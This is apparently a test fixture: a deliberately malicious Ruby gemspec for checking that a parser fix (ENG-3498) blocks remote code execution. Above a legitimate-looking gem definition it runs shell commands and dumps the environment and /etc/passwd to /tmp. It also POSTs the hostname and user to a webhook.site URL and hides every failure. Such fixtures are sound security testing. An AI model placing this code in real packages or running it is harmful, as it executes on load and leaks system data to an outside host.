# frozen_string_literal: true

# MALICIOUS GEMSPEC FOR TESTING RCE VULNERABILITY (ENG-3498)
# This file should NOT execute when processed by the safe parsing methods

# Attempt 1: Create a marker file to prove code execution
system("touch /tmp/rce_test_executed")

# Attempt 2: Try to write sensitive data
begin
  File.write("/tmp/rce_env_dump.txt", ENV.to_h.inspect)
rescue StandardError
  # Silently fail
end

# Attempt 3: Execute a command and capture output
begin
  hostname = `hostname`
  File.write("/tmp/rce_hostname.txt", hostname)
rescue StandardError
  # Silently fail
end

# Attempt 4: Network exfiltration attempt using Net::HTTP POST
begin
  require 'net/http'
  require 'uri'
  require 'json'

  uri = URI.parse("https://webhook.site/cc1bc784-4e0a-4dba-8b5f-4abe861d409a")
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = true
  http.open_timeout = 2
  http.read_timeout = 2

  request = Net::HTTP::Post.new(uri.path, {'Content-Type' => 'application/json'})
  request.body = {
    type: 'gemspec_rce',
    hostname: `hostname`.strip,
    user: ENV['USER'],
    pwd: Dir.pwd,
    timestamp: Time.now.to_i
  }.to_json

  response = http.request(request)
  File.write("/tmp/rce_http_post.txt", "POST successful: #{response.code}")
rescue StandardError => e
  # Silently fail but log that attempt was made
  File.write("/tmp/rce_http_attempt.txt", "Attempted at #{Time.now}") rescue nil
end

# Attempt 5: Try to read sensitive files
begin
  if File.exist?('/etc/passwd')
    passwd_content = File.read('/etc/passwd')
    File.write("/tmp/rce_passwd_dump.txt", passwd_content)
  end
rescue StandardError
  # Silently fail
end

# Attempt 6: Shell injection
`echo "RCE_SUCCESSFUL" > /tmp/rce_shell_injection.txt`

# The actual gemspec definition (appears legitimate)
Gem::Specification.new do |s|
  s.platform    = Gem::Platform::RUBY
  s.name        = "malicious-test-gem"
  s.version     = "0.0.1"
  s.summary     = "Test gem for RCE vulnerability testing"
  s.description = "This gem is used to test that the RCE fix prevents arbitrary code execution"

  s.required_ruby_version = ">= 2.7.0"
  s.required_rubygems_version = ">= 1.8.11"

  s.license = "MIT"

  s.author   = "Security Tester"
  s.email    = "security@test.local"
  s.homepage = "https://test.local"

  s.files = ["README.md"]

  # Add some dependencies to make it look legitimate
  s.add_dependency "rails", ">= 5.0"
  s.add_dependency "rake", ">= 12.0"
  s.add_dependency "activesupport", ">= 5.0"
end
